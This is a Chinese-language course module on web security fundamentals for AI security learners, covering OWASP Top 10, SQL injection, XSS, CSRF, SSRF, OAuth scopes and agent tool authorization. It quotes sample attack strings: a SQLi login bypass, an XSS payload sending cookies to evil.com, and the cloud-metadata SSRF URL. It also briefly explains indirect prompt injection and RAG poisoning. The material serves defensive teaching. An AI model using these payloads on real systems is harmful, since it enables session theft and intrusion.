Web 安全基础（Web Security）

定位：OWASP Top 10（SQL 注入 / XSS / CSRF / SSRF）是安全人的通用词汇表。你不需要成为渗透专家，但看到 payload 要知道它在干嘛——因为 LLM 安全的间接 prompt injection 常借 Web 页面注入。
前置：模块 G（网络基础）｜ 后继：模块 K（LLM 安全）、M（红队）
及格线：能解释 SQL 注入怎么让数据库返回不该返回的数据（H01）；能区分 authentication、token scope、对象级授权（BOLA）与功能级授权（BFLA）；能用 H02 解释 Agent 工具为什么必须在模型外做授权和 SSRF 防护。

1 OWASP Top 10：标准已更新到 2025 版

你路线文档里引用的是 2021 版。最新是 OWASP Top 10:2025（2021 后首次大改）。两版都要知道，但 2025 是当下标准：

2025 版 名称 相对 2021 的变化
A01:2025 Broken Access Control 仍居首；并入 SSRF、BOLA、BFLA（API 授权失败）
A02:2025 Security Misconfiguration 从 #5 升到 #2
A03:2025 Software Supply Chain Failures 新增（由”过时组件”扩写）
A04:2025 Cryptographic Failures 从 #2 降到 #4
A05:2025 Injection 从 #3 降到 #5（仍含 SQLi / XSS）
A06:2025 Insecure Design —
A07:2025 Authentication Failures —
A08:2025 Software or Data Integrity Failures —
A09:2025 Logging & Alerting Failures —
A10:2025 Mishandling of Exceptional Conditions 新增

作为 AI 安全研究者，你重点掌握 Injection 类（SQLi/XSS） 和 SSRF / 访问控制，其余混个脸熟即可。下面专讲这几类。

2 SQL 注入：最经典的注入

核心：用户输入被直接拼进 SQL 字符串，使得输入从”数据”变成”代码”。

为什么 ' OR 1=1 -- 能绕过登录？

'1'='1' 恒为真，OR 让它前面的条件失效 → 整条 WHERE 恒真 → 不需要正确密码也能登录（取决于拼接位置，可能还会拖出整张表）。-- 是 SQL 注释，用来吃掉后面的 ' AND password=...。

处理不可信值时的默认做法：使用参数化查询 / 预编译，把值与 SQL 结构分离：

参数化通常只绑定“值”，不能替你安全绑定表名、列名或排序方向；这类动态标识符应映射到服务端固定 allowlist。还要配合最小数据库权限、统一错误处理与审计，而不是把参数化误解为覆盖所有 SQL 风险的单一控制。

学到这里立刻做｜H01-SQLi：运行 labs/h01_sqli_xss_demo.py，把“拼接 SQL”和“参数化 SQL”的最终查询方式并排记录。再做 PortSwigger SQL injection 的入门说明与一个官方练习；只在授权靶场操作。验收物是命中行数对照和一句“为什么参数化不是黑名单过滤”。

3 XSS：在别人浏览器里跑你的 JS

  • 反射型：payload 在 URL 里，服务器把它原样拼回响应 HTML，用户一点击就执行。不经存储。
  • 存储型：payload 提交到服务器存库（评论/昵称），其他用户访问时从库取出执行。最危险、最持久。
  • DOM 型：payload 在客户端 JS 里被 innerHTML 等方式直接写入 DOM，响应源码里看不到，漏洞在 JS。

典型 payload：<script>fetch('https://evil.com/?c='+document.cookie)</script> → 偷 Cookie。

防御：

  • 输出到 HTML 时做上下文转义（HTML 实体 / JS 转义）。
  • 设 CSP（Content-Security-Policy）限制脚本来源。
  • Cookie 加 HttpOnly 防止 JS 读取。
  • 框架（React/Vue）默认转义，但 dangerouslySetInnerHTML / v-html 会绕过——这是 AI 应用里的常见坑。

接着完成｜H01-XSS：继续观察 H01 的转义前后输出，并阅读 PortSwigger XSS 对 reflected/stored/DOM 三型的区分。画一条“恶意内容写入网页 → 被 Agent/RAG 读取 → 间接注入”的继承链，不要在真实网站测试 payload。

4 CSRF：借你的身份发请求

原理：你已登录 bank.com，浏览器持有合法会话 Cookie。攻击者页面偷偷发 POST /transfer?to=attacker&amt=1000，浏览器自动带上 Cookie → 银行以为是你自己发的。

防御：

  • CSRF Token：服务端下发随机 token，敏感请求必须带上，攻击者拿不到。
  • SameSite Cookie：设 SameSite=Lax/Strict，跨站请求不带 Cookie。
  • 关键操作要求重新认证（二次密码/短信）。

5 SSRF：让服务器替你打内网

原理：服务端根据用户输入去抓一个 URL（如”导入头像 URL”），攻击者可传 http://169.254.169.254/latest/meta-data/（云元数据接口）或内网地址，让服务器访问本不允许外网碰的资源。

防御：

  • 白名单协议（只允许 https）与域名；禁止 169.254.169.254、内网 CIDR。
  • 出网请求走隔离网络 + 禁用重定向跟随。
  • 2025 版已把 SSRF 并入 A01 Broken Access Control。

6 API 身份、授权与 SSRF：Agent 工具的真正边界

6.1 四个不要混淆的检查

层次 回答的问题 典型失败
Authentication 这个调用者是谁？token 是否真实有效？ 伪造、过期或错误 issuer 的 token 被接受
Token restriction 这个 token 是给哪个 API、哪些动作的？ 不验 aud，把 A 服务 token 拿给 B 服务；scope 过宽
Object authorization 这个主体能否操作这个对象？ 改 URL 中 document_id 就读到别人数据（BOLA）
Function authorization 这个主体能否调用这个功能？ 普通成员直接调用管理员删除 API（BFLA）

对 Agent 而言，LLM 生成的 tool call 只是一个不可信动作提案。资源服务器仍需用 subject + action + resource + context 做确定性授权，不能因为调用来自“内部 Agent”就跳过检查。

6.2 OAuth 最小心智模型

OAuth 解决的是“客户端获得受限授权去访问资源”，不是给任意字符串贴上可信标签。你至少要认识：resource owner、client、authorization server、resource server，以及 access token 的 iss、aud、scope、exp。

  • audience 把 token 绑定到目标 API；资源服务器拒绝发给其他服务的 token。
  • scope 是 token 的权限上限，不等于最终授权；访问具体对象仍要检查 owner/tenant/role。
  • 公共客户端使用 authorization code + PKCE，redirect URI 做精确匹配。
  • Agent/MCP server 不应把收到的 token 原样透传给另一个下游服务；这会混淆受众和责任主体，形成 token passthrough / confused deputy。
  • 生产环境必须由成熟库验证签名、允许的算法、密钥轮换和时间；不要手写 JWT 验签。

以当前 OAuth 安全最佳实践 RFC 9700 为准；资源服务器元数据可继续看 RFC 9728。

6.3 SSRF 防御不能只做字符串黑名单

“只禁 127.0.0.1”会漏掉 IPv6、整数/混合编码、域名先解析公网后重绑定内网、以及 30x 重定向。较稳妥的顺序是：

  1. 业务允许时使用 https + hostname + port allowlist，而不是 denylist。
  2. 解析域名后检查全部 IP，拒绝 loopback、private、link-local、multicast、unspecified 等非公网目的地。
  3. 真实连接固定到已校验的解析结果，并处理 DNS rebinding；网络层限制服务账号出网。
  4. 禁用自动重定向；若业务必须跟随，每一跳都重新执行完整校验。
  5. 限制响应大小、超时、方法和内容类型，避免取回内网数据后再泄露给模型。

参考 OWASP API Security Top 10:2023 的 BOLA/BFLA/SSRF，以及 OWASP SSRF Prevention Cheat Sheet。H02 用固定 DNS 测试夹具离线演示这些决策，不会发请求。

学到这里立刻做｜H02：运行 labs/h02_api_auth_ssrf.py，给输出按“token / object / function / network destination”四层分类；然后新增一个过期 token case 和一个 allowlist 域名解析到 IPv6 loopback 的 case。阅读 RFC 9700 §2 时只提取 redirect、PKCE、audience、最小权限四项要求。最后在仓库根目录运行 python -m unittest discover -s tests -p "test_security_controls.py" -v，断言通过才算完成。

7 文件上传漏洞（扫盲）

进入下一节前的边界练习：给同一个“读取文档”请求列出 主体、租户、对象所有者、动作、目的地址 五列。依次只改一列：跨租户、同租户非本人、低权限删除、合法域名解析到私网。先预测 H02 的拒绝层再运行；一条 scope 并不能同时证明这五件事。

回看 H01 的编码边界：参数绑定固定的是 SQL 值的位置，动态表名/列名仍需受控映射。html.escape 适用于 HTML 文本等上下文，不能作为 JavaScript、CSS 或 URL 的通用防线；javascript: URL 需要协议策略，不是把引号转义就安全。H01 只打印结果，没有在浏览器中执行 XSS。

  • 传 .php/.jsp 木马 → 直接 getshell；传恶意外壳图 → 解析漏洞执行。
  • 防御：限制后缀白名单、重命名、存在非执行目录、校验真实 MIME、隔离存储。

8 和 AI 安全的连接点（核心）

  • 间接 prompt injection：攻击者把恶意指令藏在网页/评论（常借存储型 XSS 的载体）里，LLM 检索到这段内容后被执行 → 这就是 Web 漏洞和 LLM 安全的交叉。
  • RAG 投毒：往知识库（可能来自爬取的 Web 页面）注入恶意文本 → 本质是”把 Web 注入搬进 LLM 上下文”。
  • OWASP LLM Top 10 的分类（如 LLM01 Prompt Injection、LLM02 敏感信息泄露）在方法论上继承自 Web Top 10——你懂 Web 注入，就懂 LLM 注入的”为什么危险”。
  • 你跑红队（模块 M）扫描 LLM 服务时，很多 payload 就是 HTTP 表单/JSON 里的注入字符串。
  • Tool 调用最终落到 API；Prompt injection 能否造成实际损害，取决于 API 是否正确检查 token audience/scope、对象权限和出网目的地。

10 常见误区

  1. 以为”用户输入过滤一下（黑名单）就安全了” —— 黑名单永远不完整（编码、大小写、注释变体无数）；SQL 注入的正解是参数化查询（结构上隔离），不是过滤。
  2. 以为参数化查询”只是转义” —— 是编译期把 SQL 结构固定、输入只当数据绑定，攻击者在结构上无路可走。
  3. 以为 XSS 只是”弹个窗” —— 存储型 XSS + 管理员 Cookie = 接管后台；现代危害是窃取会话 + 键盘记录 + 借浏览器打内网（beef 框架的玩法）。
  4. 以为 HTTPS 能防 XSS/CSRF —— HTTPS 防传输窃听，不防应用层注入；XSS/CSRF 在应用层，TLS 无能为力。
  5. 以为 LLM 应用没有 Web 漏洞 —— LLM 应用是 Web 应用：前端、API、存储全在；v-html/innerHTML 渲染模型输出 = 存储型 XSS 的新载体（对应 LLM05 Improper Output Handling）。
  6. 有合法 token 就等于有权访问任意对象 —— token 验证只是起点；每次请求还要做对象级和功能级授权。
  7. SSRF 黑名单里写几个内网 IP 就够了 —— 域名重绑定、重定向和地址变体都会绕过；优先 allowlist，并在解析和连接层共同限制。

11 检查点（自测）

  • SQL 注入的 ' OR 1=1 -- 为什么能绕过登录？参数化查询怎么挡住它？
  • XSS 的反射型 vs 存储型区别？各举一例；v-html/innerHTML 为什么是坑
  • CSRF 借的是什么机制？SameSite / CSRF Token 怎么防？
  • SSRF 为什么能打到云元数据接口？怎么防御？
  • iss、aud、scope、exp 分别限制什么？为什么 scope 通过后仍要检查对象所有者？
  • BOLA 与 BFLA 有什么区别？各为 Agent tool API 写一个失败例子。
  • 为什么 URL 字符串通过检查后，仍要检查解析 IP、禁用或逐跳验证重定向？
  • 间接 prompt injection 和 Web 注入（尤其存储型 XSS）有什么继承关系？
